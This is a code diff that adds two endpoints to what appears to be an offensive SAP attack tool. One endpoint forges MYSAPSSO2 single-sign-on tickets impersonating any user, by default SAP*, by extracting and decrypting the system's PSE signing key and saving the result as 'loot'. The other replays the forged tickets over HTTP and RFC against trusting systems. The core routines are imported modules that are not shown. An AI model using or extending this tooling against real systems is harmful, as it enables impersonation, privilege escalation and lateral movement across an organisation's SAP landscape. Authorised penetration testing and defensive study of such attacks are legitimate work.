@@ -5943,6 +5943,144 @@ def create_app(api: SAPMAPApi) -> Bottle:
         _bg(f"{sid}:create_user", "Create User", _run)
         return json.dumps({"status": "started"})
 
+    # ── MYSAPSSO2 ticket forgery (Phase D commits 7-9) ──────────────
+    #
+    # Two endpoints, both background-task driven:
+    #
+    #   POST /api/node/<sid>/forge_ticket
+    #     {user, client, validity_min, digest, pin?,
+    #      recipient_sid?, recipient_client?}
+    #   -> extract_and_forge_ticket(node, state, ...) — runs the full
+    #      PSE-extract -> cred_v2-decrypt -> key-extract -> forge ->
+    #      save-artifacts chain.  Result lands on node.forged_tickets
+    #      + state.forged_tickets and surfaces in /api/state.
+    #
+    #   POST /api/node/<sid>/propagate_ticket
+    #     {ticket_index, target_sids?, channels?}
+    #   -> propagate_via_forged_ticket / propagate_to_trusted_subgraph
+    #      against the named receivers, recording results on the
+    #      ticket's used_on list.
+
+    @app.route("/api/node/<sid>/forge_ticket", method="POST")
+    def node_forge_ticket(sid):
+        """Forge a MYSAPSSO2 logon ticket impersonating an arbitrary
+        user, signed by the issuing system's SAPSYS.pse.
+
+        Body parameters (all optional unless noted):
+            user              str   default "SAP*"
+            client            str   default "100"
+            validity_min      int   default 120
+            digest            str   default "sha256"  (use "sha1" for
+                                       DSA-signed SAPSYS.pse on older
+                                       kernels)
+            pin               str   optional — bypass the candidate
+                                       walk and use this PIN directly
+            recipient_sid     str   optional STRUSTSSO2 pin
+            recipient_client  str   optional STRUSTSSO2 client pin
+        """
+        response.content_type = "application/json"
+        data = request.json or {}
+        node = api.state.get_node(sid)
+        if not node:
+            return json.dumps({"error": f"Node {sid} not found"})
+
+        user = data.get("user") or "SAP*"
+        client = str(data.get("client") or "100")
+        validity_min = int(data.get("validity_min") or 120)
+        digest = data.get("digest") or "sha256"
+        pin = data.get("pin")
+        recipient_sid = data.get("recipient_sid") or None
+        recipient_client = data.get("recipient_client") or None
+
+        def _run():
+            from sapmap_exploit import extract_and_forge_ticket
+            r = extract_and_forge_ticket(
+                node=node, state=api.state,
+                user=user, client=client,
+                validity_min=validity_min, digest=digest,
+                pin=pin,
+                recipient_sid=recipient_sid,
+                recipient_client=recipient_client,
+            )
+            if r.get("success"):
+                print(f"[+] {sid}: MYSAPSSO2 ticket forged for "
+                      f"{user!r}@{client} — "
+                      f"{r['ticket_size']}B, loot {r['loot_path']}")
+            else:
+                print(f"[-] {sid}: ticket forgery failed — "
+                      f"{r.get('error', '?')}")
+                # Print the per-step audit so the operator sees where
+                # the chain broke (cred_v2 / key_extract / forge / ...)
+                for step in r.get("steps", []):
+                    mark = "✓" if step["ok"] else "✗"
+                    print(f"      [{mark}] {step['name']:14s} "
+                          f"{step.get('detail', '')[:100]}")
+
+        _bg(f"{sid}:forge_ticket", "Forge MYSAPSSO2 Ticket", _run)
+        return json.dumps({"status": "started"})
+
+    @app.route("/api/node/<sid>/propagate_ticket", method="POST")
+    def node_propagate_ticket(sid):
+        """Replay a previously forged MYSAPSSO2 ticket against one or
+        more STRUSTSSO2-trusted receivers.
+
+        Body parameters:
+            ticket_index    int   index into node.forged_tickets
+                                  (default 0 — most-recent forgery)
+            target_sids     list  receivers to try.  When omitted,
+                                  defaults to the issuer SID itself
+                                  (self-trust) — operators can add
+                                  more by passing the SIDs they read
+                                  from STRUSTSSO2 / TWPSSO2ACL.
+            channels        list  subset of ["http", "rfc"]
+                                  (default both)
+            timeout         int   per-attempt seconds (default 10)
+        """
+        response.content_type = "application/json"
+        data = request.json or {}
+        node = api.state.get_node(sid)
+        if not node:
+            return json.dumps({"error": f"Node {sid} not found"})
+
+        if not node.forged_tickets:
+            return json.dumps({"error":
+                f"{sid} has no forged tickets — run forge_ticket first"})
+
+        ticket_idx = int(data.get("ticket_index") or 0)
+        if ticket_idx < 0 or ticket_idx >= len(node.forged_tickets):
+            return json.dumps({"error":
+                f"ticket_index={ticket_idx} out of range "
+                f"(node has {len(node.forged_tickets)} ticket(s))"})
+
+        ticket = node.forged_tickets[ticket_idx]
+        target_sids = data.get("target_sids") or [sid]
+        channels = data.get("channels") or ["http", "rfc"]
+        timeout = int(data.get("timeout") or 10)
+
+        def _run():
+            from sap_ticket_propagate import (
+                propagate_to_trusted_subgraph)
+            print(f"[*] {sid}: propagating ticket "
+                  f"{ticket.display_label()} -> "
+                  f"{', '.join(target_sids)}")
+            r = propagate_to_trusted_subgraph(
+                ticket=ticket, state=api.state,
+                candidate_sids=target_sids,
+                channels=channels, timeout=timeout)
+            print(f"[*] {sid}: propagation done — "
+                  f"{r['succeeded']}/{r['tried']} succeeded")
+            for entry in r["results"]:
+                mark = "✓" if entry["success"] else "✗"
+                channel = entry.get("channel") or "—"
+                ev = (entry.get("evidence")
+                      or entry.get("error", ""))[:100]
+                print(f"      [{mark}] {entry['sid']:6s} "
+                      f"{channel:6s} {ev}")
+
+        _bg(f"{sid}:propagate_ticket", "Propagate MYSAPSSO2 Ticket",
+            _run)
+        return json.dumps({"status": "started"})
+
     @app.route("/api/node/<sid>/analyse_capabilities", method="POST")
     def node_analyse_capabilities(sid):
         """Run the role / profile capability analyser against every
